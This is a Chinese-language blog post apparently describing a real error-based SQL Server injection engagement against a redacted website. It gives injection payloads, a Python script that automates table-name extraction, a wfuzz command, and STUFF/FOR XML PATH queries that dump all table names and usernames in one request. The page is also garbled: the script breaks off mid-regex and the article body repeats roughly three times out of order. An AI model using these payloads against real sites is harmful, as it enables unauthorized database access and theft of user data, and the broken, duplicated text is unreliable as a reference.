<!DOCTYPE html>
<html>

  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>SQL Server注入 - STUFF与XML Path « 倾旋的博客</title>
  <meta name="description" content="背景某次XX，发现一处SQL Server注入点报错注入SQL Server注入，一般也是先找库、再找表、再查字段、最终查询数据。查库1.查第一个：id=1 and (SELECT top 1 Name FROM Master..SysDatabases)&gt;0 --2.NOT INid=1 and (SEL...">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://payloads.online/archivers/2020-03-02/3">
  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
</head>


  <body>

    <div class="header-placeholder"></div>
<header class="header">
  <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    <a class="site-title" href="/">倾旋的博客</a>
    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/">About</a>
      
        
        <a class="page-link" href="/posts/">Posts</a>
      
        
        <a class="page-link" href="/links/">Links</a>
      
        
        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
      
        
        <a class="page-link" href="/feed.xml">RSS</a>
      
    </nav>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="col-main">
          <div class="post">

  <header class="post-header">
    <h1 class="post-title">SQL Server注入 - STUFF与XML Path</h1>
    <p class="post-meta">Mar 2, 2020</p>
  </header>

  <article class="post-content">
    <h2 id="背景">背景</h2>

<p>某次XX，发现一处SQL Server注入点</p>

<h2 id="报错注入">报错注入</h2>

<p>SQL Server注入，一般也是先找库、再找表、再查字段、最终查询数据。</p>

<h2 id="查库">查库</h2>

<p>1.查第一个：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="p">(</span><span class="k">SELECT</span> <span class="n">top</span> <span class="mi">1</span> <span class="n">Name</span> <span class="k">FROM</span> <span class="n">Master</span><span class="p">..</span><span class="n">SysDatabases</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span> <span class="c1">--</span>
</code></pre></div></div>

<p>2.NOT IN</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="p">(</span><span class="k">SELECT</span> <span class="n">top</span> <span class="mi">1</span> <span class="n">Name</span> <span class="k">FROM</span> <span class="n">Master</span><span class="p">..</span><span class="n">SysDatabases</span> <span class="k">where</span> <span class="n">name</span> <span class="k">not</span> <span class="k">in</span> <span class="p">(</span><span class="s1">'master'</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">0</span> <span class="c1">--</span>
</code></pre></div></div>

<p>其中，NOT IN的集合会不断增加，最终无法查出其他结果，那么这个集合就是所有的数据库名称。</p>

<h2 id="查表">查表</h2>

<p>在这一步，我们就可以自动化实现了：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">table_list</span> <span class="o">=</span> <span class="p">[</span><span class="s">''</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">get_sqlserver_table</span><span class="p">(</span><span class="n">table_list</span><span class="p">,</span> <span class="n">table_num</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">table_num</span><span class="p">):</span>
        <span class="c1"># print("','".join(table_list))
</span>        <span class="n">sql_str</span> <span class="o">=</span> <span class="s">"and (select top 1 name from [xxxx].sys.all_objects where type='U' AND is_ms_shipped=0 and name not in ('{}'))&gt;0"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="s">"','"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">table_list</span><span class="p">))</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s">"http://www.xxxxx.cn/x.aspx?cid=1' {} AND 'aNmV'='aNmV"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sql_str</span><span class="p">)</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'User-Agent'</span><span class="p">:</span> <span class="s">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36'</span><span class="p">})</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">'

当取得第16个的时候，还是没有出现用户表、管理员表等，而且网站抛出了错误，无法继续取，突然没有其他办法了。

![2020-03-01-11-34-21](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/d60590ed04ec4d3da6e917429c7cc4d4.png)


先来分析一下语句：

```sql
cid =1 and (select top 1 name from [数据库名称].sys.all_objects where type='</span><span class="sa">U</span><span class="s">' AND is_ms_shipped=0 and name not in (''))&gt;0 AND '</span><span class="n">aNmV</span><span class="s">'='</span><span class="n">aNmV</span>
</code></pre></div></div>

<p>这是第一次请求的Payload，集合这里我写个空，不管怎样，集合都可以取得第一个表名。第二个、第三个表名都会向集合增加，以此类推，通过SQLMAP判断，有146个表。</p>

<p>到第16个因为原始语句有干扰，不能继续取得后续的表名，但我不想放弃。</p>

<p>于是，又想到通过FUZZ的方式：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/835850cccf61c6d461e1fa9e4bede6bc.png" alt="2020-03-01-11-34-39"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -z file,/usr/shar/sqlmap/data/common-table.txt --sc 500 "http://www.xxx/xxx?cid=1%27%20and%20%20(select%20top%201%20COLUMN_NAME%20from%20xxx.information_schema.columns%20where%20TABLE_NAME=%27Hsoft_FUZZ%27%20and%20COLUMN_NAME%20not%20in(%27x%27))%3E0%20and%20%27s%27=%27s"
</code></pre></div></div>

<ul>
  <li>
<code class="language-plaintext highlighter-rouge">Hsoft_</code> 为前缀</li>
  <li>sc 500 只匹配错误页面（报错注入）</li>
</ul>

<p>但是字典貌似不够强大，我就去查询SQL Server有没有类似将多行数据合并为一行的办法。</p>

<p>我知道MySQL中有GroupConcat类似的函数，但SQL Server没有，这点很遗憾~ 没有继续使用SQL Map是因为SQLMAP根本无法取得任何一个表名，期间我也分析了SQL MAP的Payload，请求实在是多，就放弃了这条线。</p>

<h2 id="stuff与xml-path">STUFF与XML Path</h2>

<p>STUFF字符串函数是将字符串插入到另一个字符串中。它会删除开始位置第一个字符串中的指定长度的字符，然后将第二个字符串插入到开始位置的第一个字符串中，语法如下。</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">STUFF</span><span class="err">（</span><span class="o">&lt;</span><span class="n">character_expression</span><span class="o">&gt;</span><span class="err">，</span><span class="o">&lt;</span><span class="err">开始</span><span class="o">&gt;</span><span class="err">，</span><span class="o">&lt;</span><span class="err">长度</span><span class="o">&gt;</span><span class="err">，</span><span class="o">&lt;</span><span class="n">character_expression</span><span class="o">&gt;</span><span class="err">）</span>
<span class="o">&lt;</span><span class="n">character_expression</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>参数是给定的字符串数据，可以是字符或二进制数据的常量，变量或列。<code class="language-plaintext highlighter-rouge">&lt;start&gt;</code>参数是一个整数值，指定开始删除和插入的位置，可以是BIGINT类型。如果<code class="language-plaintext highlighter-rouge">&lt;开始&gt;</code>或<code class="language-plaintext highlighter-rouge">&lt;长度&gt;</code>参数为负数，则返回NULL字符串。如果<code class="language-plaintext highlighter-rouge">&lt;start&gt;</code>参数比第一个<code class="language-plaintext highlighter-rouge">&lt;character_expression&gt;</code>长，则返回一个NULL字符串。 <length>参数可以是BIGINT类型，它是一个整数，指定要删除的字符数。如果<length>比第一个`<character_expression>`长，则删除发生到最后一个`<character_expression>`中的最后一个字符。</character_expression></character_expression></length></length></p>

<p>STUFF最常见的用途莫过于结合FOR XML PATH对返回JSON字符串的拼接。首先利用FOR XML PATH则返回XML格式的字符串，我们将FOR XML PATH添加到查询的末尾，此时允许我们将查询的结果作为XML元素输出，元素名称包含在PATH参数中。</p>

<p>如：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">dbo</span><span class="p">.</span><span class="n">base_pay_type</span> <span class="k">WHERE</span> <span class="n">is_enabled</span> <span class="o">=</span> <span class="mi">1</span>
</code></pre></div></div>

<p>类似的SQL可能会返回多行数据，因此可以通过STUFF与XML PATH集合使用：</p>

<ul>
  <li>将查询到的数据转换成行，以逗号隔开，以<code class="language-plaintext highlighter-rouge">[]</code>包裹</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">STUFF</span><span class="p">((</span><span class="k">SELECT</span>  <span class="s1">'['</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s1">'],'</span>  
<span class="k">FROM</span><span class="p">(</span><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">dbo</span><span class="p">.</span><span class="n">base_pay_type</span> <span class="k">WHERE</span> <span class="n">is_enabled</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="n">a</span>  <span class="k">FOR</span>  <span class="n">XML</span> <span class="n">PATH</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>  <span class="p">),</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span> <span class="k">AS</span> <span class="n">Name</span> 
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7fadd9802ea0134308ad9c8e3e1fa7eb.png" alt="2020-03-01-11-35-00"></p>

<p>直接套用到注入场景：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">STUFF</span><span class="p">((</span><span class="k">SELECT</span>  <span class="s1">'['</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s1">'],'</span>  <span class="k">FROM</span><span class="p">(</span><span class="k">SELECT</span> <span class="n">name</span> <span class="k">from</span> <span class="err">数据库名称</span><span class="p">.</span><span class="n">sys</span><span class="p">.</span><span class="n">all_objects</span> <span class="k">where</span> <span class="k">type</span><span class="o">=</span><span class="s1">'U'</span> <span class="k">AND</span> <span class="n">is_ms_shipped</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="n">a</span>  <span class="k">FOR</span>  <span class="n">XML</span> <span class="n">PATH</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>  <span class="p">),</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
</code></pre></div></div>

<p>在sql shell中直接执行即可返回所有表名：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f1db9589f0c703b6ff101490ab00b90e.png" alt="2020-03-01-11-35-15"></p>

<p>所有表名以<code class="language-plaintext highlighter-rouge">[表名],</code>分割。</p>

<p>通过这个办法，我们可以套用很多需要多次请求注入的需求，如：</p>

<ul>
  <li>取得某个表10个用户名</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">STUFF</span><span class="p">((</span><span class="k">SELECT</span>  <span class="s1">'['</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s1">'],'</span>  <span class="k">FROM</span><span class="p">(</span><span class="k">SELECT</span> <span class="n">Top</span> <span class="mi">10</span> <span class="n">username</span> <span class="k">from</span> <span class="err">数据库名称</span><span class="p">.</span><span class="k">User</span> <span class="p">)</span> <span class="n">a</span>  <span class="k">FOR</span>  <span class="n">XML</span> <span class="n">PATH</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>  <span class="p">),</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>取得所有数据库名</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">STUFF</span><span class="p">((</span><span class="k">SELECT</span>  <span class="s1">'['</span> <span class="o">+</span> <span class="n">Name</span> <span class="o">+</span> <span class="s1">'],'</span>  <span class="k">FROM</span><span class="p">(</span><span class="k">SELECT</span>  <span class="n">Name</span> <span class="k">from</span> <span class="n">Master</span><span class="p">..</span><span class="n">SysDatabases</span> <span class="p">)</span> <span class="n">a</span>  <span class="k">FOR</span>  <span class="n">XML</span> <span class="n">PATH</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>  <span class="p">),</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
</code></pre></div></div>

<p>其他场景自行想象！
(.*)</p>

<p>当取得第16个的时候，还是没有出现用户表、管理员表等，而且网站抛出了错误，无法继续取，突然没有其他办法了。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/d60590ed04ec4d3da6e917429c7cc4d4.png" alt="2020-03-01-11-34-21"></p>

<p>先来分析一下语句：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cid</span> <span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="n">top</span> <span class="mi">1</span> <span class="n">name</span> <span class="k">from</span> <span class="p">[</span><span class="err">数据库名称</span><span class="p">].</span><span class="n">sys</span><span class="p">.</span><span class="n">all_objects</span> <span class="k">where</span> <span class="k">type</span><span class="o">=</span><span class="s1">'U'</span> <span class="k">AND</span> <span class="n">is_ms_shipped</span><span class="o">=</span><span class="mi">0</span> <span class="k">and</span> <span class="n">name</span> <span class="k">not</span> <span class="k">in</span> <span class="p">(</span><span class="s1">''</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">0</span> <span class="k">AND</span> <span class="s1">'aNmV'</span><span class="o">=</span><span class="s1">'aNmV
</span></code></pre></div></div>

<p>这是第一次请求的Payload，集合这里我写个空，不管怎样，集合都可以取得第一个表名。第二个、第三个表名都会向集合增加，以此类推，通过SQLMAP判断，有146个表。</p>

<p>到第16个因为原始语句有干扰，不能继续取得后续的表名，但我不想放弃。</p>

<p>于是，又想到通过FUZZ的方式：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/835850cccf61c6d461e1fa9e4bede6bc.png" alt="2020-03-01-11-34-39"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -z file,/usr/shar/sqlmap/data/common-table.txt --sc 500 "http://www.xxx/xxx?cid=1%27%20and%20%20(select%20top%201%20COLUMN_NAME%20from%20xxx.information_schema.columns%20where%20TABLE_NAME=%27Hsoft_FUZZ%27%20and%20COLUMN_NAME%20not%20in(%27x%27))%3E0%20and%20%27s%27=%27s"
</code></pre></div></div>

<ul>
  <li>
<code class="language-plaintext highlighter-rouge">Hsoft_</code> 为前缀</li>
  <li>sc 500 只匹配错误页面（报错注入）</li>
</ul>

<p>但是字典貌似不够强大，我就去查询SQL Server有没有类似将多行数据合并为一行的办法。</p>

<p>我知道MySQL中有GroupConcat类似的函数，但SQL Server没有，这点很遗憾~ 没有继续使用SQL Map是因为SQLMAP根本无法取得任何一个表名，期间我也分析了SQL MAP的Payload，请求实在是多，就放弃了这条线。</p>

<h2 id="stuff与xml-path-1">STUFF与XML Path</h2>

<p>STUFF字符串函数是将字符串插入到另一个字符串中。它会删除开始位置第一个字符串中的指定长度的字符，然后将第二个字符串插入到开始位置的第一个字符串中，语法如下。</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">STUFF</span><span class="err">（</span><span class="o">&lt;</span><span class="n">character_expression</span><span class="o">&gt;</span><span class="err">，</span><span class="o">&lt;</span><span class="err">开始</span><span class="o">&gt;</span><span class="err">，</span><span class="o">&lt;</span><span class="err">长度</span><span class="o">&gt;</span><span class="err">，</span><span class="o">&lt;</span><span class="n">character_expression</span><span class="o">&gt;</span><span class="err">）</span>
<span class="o">&lt;</span><span class="n">character_expression</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>参数是给定的字符串数据，可以是字符或二进制数据的常量，变量或列。<code class="language-plaintext highlighter-rouge">&lt;start&gt;</code>参数是一个整数值，指定开始删除和插入的位置，可以是BIGINT类型。如果<code class="language-plaintext highlighter-rouge">&lt;开始&gt;</code>或<code class="language-plaintext highlighter-rouge">&lt;长度&gt;</code>参数为负数，则返回NULL字符串。如果<code class="language-plaintext highlighter-rouge">&lt;start&gt;</code>参数比第一个<code class="language-plaintext highlighter-rouge">&lt;character_expression&gt;</code>长，则返回一个NULL字符串。 <length>参数可以是BIGINT类型，它是一个整数，指定要删除的字符数。如果<length>比第一个`<character_expression>`长，则删除发生到最后一个`<character_expression>`中的最后一个字符。</character_expression></character_expression></length></length></p>

<p>STUFF最常见的用途莫过于结合FOR XML PATH对返回JSON字符串的拼接。首先利用FOR XML PATH则返回XML格式的字符串，我们将FOR XML PATH添加到查询的末尾，此时允许我们将查询的结果作为XML元素输出，元素名称包含在PATH参数中。</p>

<p>如：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">dbo</span><span class="p">.</span><span class="n">base_pay_type</span> <span class="k">WHERE</span> <span class="n">is_enabled</span> <span class="o">=</span> <span class="mi">1</span>
</code></pre></div></div>

<p>类似的SQL可能会返回多行数据，因此可以通过STUFF与XML PATH集合使用：</p>

<ul>
  <li>将查询到的数据转换成行，以逗号隔开，以<code class="language-plaintext highlighter-rouge">[]</code>包裹</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">STUFF</span><span class="p">((</span><span class="k">SELECT</span>  <span class="s1">'['</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s1">'],'</span>  
<span class="k">FROM</span><span class="p">(</span><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">dbo</span><span class="p">.</span><span class="n">base_pay_type</span> <span class="k">WHERE</span> <span class="n">is_enabled</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="n">a</span>  <span class="k">FOR</span>  <span class="n">XML</span> <span class="n">PATH</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>  <span class="p">),</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span> <span class="k">AS</span> <span class="n">Name</span> 
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7fadd9802ea0134308ad9c8e3e1fa7eb.png" alt="2020-03-01-11-35-00"></p>

<p>直接套用到注入场景：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">STUFF</span><span class="p">((</span><span class="k">SELECT</span>  <span class="s1">'['</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s1">'],'</span>  <span class="k">FROM</span><span class="p">(</span><span class="k">SELECT</span> <span class="n">name</span> <span class="k">from</span> <span class="err">数据库名称</span><span class="p">.</span><span class="n">sys</span><span class="p">.</span><span class="n">all_objects</span> <span class="k">where</span> <span class="k">type</span><span class="o">=</span><span class="s1">'U'</span> <span class="k">AND</span> <span class="n">is_ms_shipped</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="n">a</span>  <span class="k">FOR</span>  <span class="n">XML</span> <span class="n">PATH</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>  <span class="p">),</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
</code></pre></div></div>

<p>在sql shell中直接执行即可返回所有表名：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f1db9589f0c703b6ff101490ab00b90e.png" alt="2020-03-01-11-35-15"></p>

<p>所有表名以<code class="language-plaintext highlighter-rouge">[表名],</code>分割。</p>

<p>通过这个办法，我们可以套用很多需要多次请求注入的需求，如：</p>

<ul>
  <li>取得某个表10个用户名</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">STUFF</span><span class="p">((</span><span class="k">SELECT</span>  <span class="s1">'['</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s1">'],'</span>  <span class="k">FROM</span><span class="p">(</span><span class="k">SELECT</span> <span class="n">Top</span> <span class="mi">10</span> <span class="n">username</span> <span class="k">from</span> <span class="err">数据库名称</span><span class="p">.</span><span class="k">User</span> <span class="p">)</span> <span class="n">a</span>  <span class="k">FOR</span>  <span class="n">XML</span> <span class="n">PATH</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>  <span class="p">),</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>取得所有数据库名</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">STUFF</span><span class="p">((</span><span class="k">SELECT</span>  <span class="s1">'['</span> <span class="o">+</span> <span class="n">Name</span> <span class="o">+</span> <span class="s1">'],'</span>  <span class="k">FROM</span><span class="p">(</span><span class="k">SELECT</span>  <span class="n">Name</span> <span class="k">from</span> <span class="n">Master</span><span class="p">..</span><span class="n">SysDatabases</span> <span class="p">)</span> <span class="n">a</span>  <span class="k">FOR</span>  <span class="n">XML</span> <span class="n">PATH</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>  <span class="p">),</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
</code></pre></div></div>

<p>其他场景自行想象！
‘, r.content.decode(‘utf-8’),  re.M|re.I)
        table_name = str(res.group(1))
        table_list.append(table_name)
        print(“[{}] - TableName: {}”.format(str(r.status_code), table_name))
if <strong>name</strong> == “<strong>main</strong>”:
    get_sqlserver_table(table_list, 16)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
当取得第16个的时候，还是没有出现用户表、管理员表等，而且网站抛出了错误，无法继续取，突然没有其他办法了。

![2020-03-01-11-34-21](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/d60590ed04ec4d3da6e917429c7cc4d4.png)


先来分析一下语句：

```sql
cid =1 and (select top 1 name from [数据库名称].sys.all_objects where type='U' AND is_ms_shipped=0 and name not in (''))&gt;0 AND 'aNmV'='aNmV
</code></pre></div></div>

<p>这是第一次请求的Payload，集合这里我写个空，不管怎样，集合都可以取得第一个表名。第二个、第三个表名都会向集合增加，以此类推，通过SQLMAP判断，有146个表。</p>

<p>到第16个因为原始语句有干扰，不能继续取得后续的表名，但我不想放弃。</p>

<p>于是，又想到通过FUZZ的方式：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/835850cccf61c6d461e1fa9e4bede6bc.png" alt="2020-03-01-11-34-39"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -z file,/usr/shar/sqlmap/data/common-table.txt --sc 500 "http://www.xxx/xxx?cid=1%27%20and%20%20(select%20top%201%20COLUMN_NAME%20from%20xxx.information_schema.columns%20where%20TABLE_NAME=%27Hsoft_FUZZ%27%20and%20COLUMN_NAME%20not%20in(%27x%27))%3E0%20and%20%27s%27=%27s"
</code></pre></div></div>

<ul>
  <li>
<code class="language-plaintext highlighter-rouge">Hsoft_</code> 为前缀</li>
  <li>sc 500 只匹配错误页面（报错注入）</li>
</ul>

<p>但是字典貌似不够强大，我就去查询SQL Server有没有类似将多行数据合并为一行的办法。</p>

<p>我知道MySQL中有GroupConcat类似的函数，但SQL Server没有，这点很遗憾~ 没有继续使用SQL Map是因为SQLMAP根本无法取得任何一个表名，期间我也分析了SQL MAP的Payload，请求实在是多，就放弃了这条线。</p>

<h2 id="stuff与xml-path-2">STUFF与XML Path</h2>

<p>STUFF字符串函数是将字符串插入到另一个字符串中。它会删除开始位置第一个字符串中的指定长度的字符，然后将第二个字符串插入到开始位置的第一个字符串中，语法如下。</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">STUFF</span><span class="err">（</span><span class="o">&lt;</span><span class="n">character_expression</span><span class="o">&gt;</span><span class="err">，</span><span class="o">&lt;</span><span class="err">开始</span><span class="o">&gt;</span><span class="err">，</span><span class="o">&lt;</span><span class="err">长度</span><span class="o">&gt;</span><span class="err">，</span><span class="o">&lt;</span><span class="n">character_expression</span><span class="o">&gt;</span><span class="err">）</span>
<span class="o">&lt;</span><span class="n">character_expression</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>参数是给定的字符串数据，可以是字符或二进制数据的常量，变量或列。<code class="language-plaintext highlighter-rouge">&lt;start&gt;</code>参数是一个整数值，指定开始删除和插入的位置，可以是BIGINT类型。如果<code class="language-plaintext highlighter-rouge">&lt;开始&gt;</code>或<code class="language-plaintext highlighter-rouge">&lt;长度&gt;</code>参数为负数，则返回NULL字符串。如果<code class="language-plaintext highlighter-rouge">&lt;start&gt;</code>参数比第一个<code class="language-plaintext highlighter-rouge">&lt;character_expression&gt;</code>长，则返回一个NULL字符串。 <length>参数可以是BIGINT类型，它是一个整数，指定要删除的字符数。如果<length>比第一个`<character_expression>`长，则删除发生到最后一个`<character_expression>`中的最后一个字符。</character_expression></character_expression></length></length></p>

<p>STUFF最常见的用途莫过于结合FOR XML PATH对返回JSON字符串的拼接。首先利用FOR XML PATH则返回XML格式的字符串，我们将FOR XML PATH添加到查询的末尾，此时允许我们将查询的结果作为XML元素输出，元素名称包含在PATH参数中。</p>

<p>如：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">dbo</span><span class="p">.</span><span class="n">base_pay_type</span> <span class="k">WHERE</span> <span class="n">is_enabled</span> <span class="o">=</span> <span class="mi">1</span>
</code></pre></div></div>

<p>类似的SQL可能会返回多行数据，因此可以通过STUFF与XML PATH集合使用：</p>

<ul>
  <li>将查询到的数据转换成行，以逗号隔开，以<code class="language-plaintext highlighter-rouge">[]</code>包裹</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">STUFF</span><span class="p">((</span><span class="k">SELECT</span>  <span class="s1">'['</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s1">'],'</span>  
<span class="k">FROM</span><span class="p">(</span><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">dbo</span><span class="p">.</span><span class="n">base_pay_type</span> <span class="k">WHERE</span> <span class="n">is_enabled</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="n">a</span>  <span class="k">FOR</span>  <span class="n">XML</span> <span class="n">PATH</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>  <span class="p">),</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span> <span class="k">AS</span> <span class="n">Name</span> 
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7fadd9802ea0134308ad9c8e3e1fa7eb.png" alt="2020-03-01-11-35-00"></p>

<p>直接套用到注入场景：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">STUFF</span><span class="p">((</span><span class="k">SELECT</span>  <span class="s1">'['</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s1">'],'</span>  <span class="k">FROM</span><span class="p">(</span><span class="k">SELECT</span> <span class="n">name</span> <span class="k">from</span> <span class="err">数据库名称</span><span class="p">.</span><span class="n">sys</span><span class="p">.</span><span class="n">all_objects</span> <span class="k">where</span> <span class="k">type</span><span class="o">=</span><span class="s1">'U'</span> <span class="k">AND</span> <span class="n">is_ms_shipped</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="n">a</span>  <span class="k">FOR</span>  <span class="n">XML</span> <span class="n">PATH</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>  <span class="p">),</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
</code></pre></div></div>

<p>在sql shell中直接执行即可返回所有表名：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f1db9589f0c703b6ff101490ab00b90e.png" alt="2020-03-01-11-35-15"></p>

<p>所有表名以<code class="language-plaintext highlighter-rouge">[表名],</code>分割。</p>

<p>通过这个办法，我们可以套用很多需要多次请求注入的需求，如：</p>

<ul>
  <li>取得某个表10个用户名</li>
</ul>

